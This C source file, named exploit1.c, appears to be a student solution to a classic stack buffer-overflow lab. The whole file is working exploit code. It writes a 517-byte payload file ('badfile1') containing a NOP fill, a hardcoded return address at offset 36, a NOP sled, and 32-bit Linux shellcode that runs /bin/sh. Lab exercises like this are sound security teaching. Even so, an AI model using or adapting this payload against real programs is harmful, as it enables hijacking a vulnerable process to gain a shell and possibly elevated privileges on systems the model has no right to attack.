/* exploit1.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;
//\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile1;
	
	
    //memset(buf, 'A', sizeof(buf));  //FInd at which location program crashes
    //char allAs[] ="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

    
    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

  

    /* You need to figure out the fake return address. */
    char return_address[] = "\xd0\xf1\xff\xbf";

    char nop_sleds[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

    
  // Position of the return address (36, since array indices start at 0)
    memcpy(buffer + 36, return_address, 4);

    // Calculate the start position for the shellcode to ensure it fits
    // This depends on the length of your NOP sled and the total buffer size
    // For example, if you want the shellcode to be at the end of the buffer:
    int shellcode_pos = 517 - sizeof(shellcode);

    // Copy the NOP sled to immediately after the return address
    // Adjust the size to fit your specific layout
    memcpy(buffer + 36 + 4, nop_sleds, sizeof(nop_sleds)-1);

    // Copy the shellcode to the end of the buffer
    memcpy(buffer + 36 + 4 + 80, shellcode, sizeof(shellcode) - 1); // -1 to exclude the null terminator
    
    //printf("%s\n", buffer);

    /* Save the contents to the file "badfile1" */
    badfile1 = fopen("./badfile1", "w");
    fwrite(buffer, 517, 1, badfile1);
    fclose(badfile1);
}
